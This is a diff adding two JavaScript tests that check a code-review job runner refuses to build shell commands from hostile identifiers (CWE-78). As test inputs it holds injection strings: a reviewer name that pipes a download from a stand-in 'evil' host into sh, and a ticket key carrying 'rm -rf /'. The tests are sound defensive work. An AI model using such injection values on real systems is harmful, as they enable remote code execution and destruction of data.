@@ -84,6 +84,27 @@ test('selection: triggerPaths gate hunks-only reviewers; first-rounds reviewers 
         ['general', 'scoped', 'jsOnlyHunks'], 'the hunks round scopes hunks-only reviewers by triggerPaths');
 });
 
+test('the CWE-78 guard: a hostile reviewer name never composes a spawn command', function() {
+    var spawned = [];
+    var io = inJob.memoryIo({}, function(cmd) { spawned.push(cmd); });
+    var pool = poolOf([skillOf('x; curl evil|sh')]);
+    var round = inJob.runSpecialists(io, pool, ctxOf({ hasNewHunks: true, newHunkPaths: ['js/x.js'] }));
+    assert.deepStrictEqual(round.completed, [], 'nothing completed');
+    assert.deepStrictEqual(spawned, [], 'NO command was built');
+    assert.strictEqual(round.unavailable[0], 'x; curl evil|sh');
+    assert.ok(round.results[0].reason.indexOf('unsafe identifier') === 0,
+        'the guard reason names the refusal');
+});
+
+test('the CWE-78 guard: a hostile ticket key is refused the same way', function() {
+    var spawned = [];
+    var io = inJob.memoryIo({}, function(cmd) { spawned.push(cmd); });
+    var pool = poolOf([skillOf('security')]);
+    var round = inJob.runSpecialists(io, pool, ctxOf({ ticketKey: 'gh-1"; rm -rf /', hasNewHunks: true }));
+    assert.deepStrictEqual(spawned, [], 'NO command built for a hostile ticket key');
+    assert.deepStrictEqual(round.unavailable, ['security']);
+});
+
 test('roundTypeOf: first vs hunks', function() {
     assert.strictEqual(inJob.roundTypeOf(ctxOf({ hasNewHunks: false })), 'first');
     assert.strictEqual(inJob.roundTypeOf(ctxOf({ hasNewHunks: true })), 'hunks');
